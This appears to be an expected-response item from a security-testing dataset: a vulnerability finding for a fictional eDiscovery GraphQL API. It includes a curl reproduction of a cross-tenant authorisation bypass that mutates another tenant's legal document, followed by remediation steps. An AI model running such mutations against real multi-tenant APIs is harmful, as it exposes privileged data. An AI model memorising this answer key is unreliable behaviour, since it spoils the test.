# Expected Response

## System
- **Domain:** Legal Tech / eDiscovery
- **System:** LexVault eDiscovery API
- **Example ID:** GQL-0224

## Priority Findings

### Finding 1: Legal eDiscovery — BOLA Multi-Tenant Access via updateResource Exposes Cross-Tenant Case Documents (Pattern 1.5)
**Severity:** High
**Category:** BOLA / Multi-Tenant / Cross-Tenant Access

**Summary:**
Per §4.0 (RISK-GQL-224): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.5 — multi-tenant/cross-tenant access): the `updateResource` mutation processes cross-tenant document resources when the resolver lacks tenant ownership validation. An attacker from `tenant-64ed` submitted `updateResource(id: "R-2224", input: {status: "approved", ownerId: "attacker-64ed2db6"})` against a legal discovery document belonging to `tenant-2db6`, receiving `CONFIDENTIAL-64ed2db6`. In Legal Tech / eDiscovery, cross-tenant access to case documents, privileged communications, and litigation data violates attorney-client privilege and legal confidentiality obligations.

**Evidence from HAR:**
- Request: `POST https://api.lexvault-ediscovery-.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-64ed`
- Mutation: `updateResource(id: "R-2224", input: {status: "approved", ownerId: "attacker-64ed2db6"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-2db6"`, `ownerId: "other-user-64ed2db6"`, `sensitiveField: "CONFIDENTIAL-64ed2db6"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-64ed2db6`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-224 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.5 | Multi-tenant cross-tenant access via mutation |
| HAR mutation | input.ownerId | attacker-64ed2db6 (client-injected) |
| HAR response | tenantId | tenant-2db6 returned to tenant-64ed |
| HAR response | sensitiveField | CONFIDENTIAL-64ed2db6 |
| HAR header | x-request-id | req-64ed2db6 |

## Steps to Reproduce

### Step 1 — updateResource multi-tenant BOLA legal eDiscovery (HAR)
```bash
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-64ed" \
  -d '{"query": "mutation { updateResource(id: \"R-2224\", input: {status: \"approved\", ownerId: \"attacker-64ed2db6\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-2db6` legal document mutated, returns `CONFIDENTIAL-64ed2db6`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`; derive from JWT.
3. Legal document access must be logged with full audit trail per e-discovery regulations.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
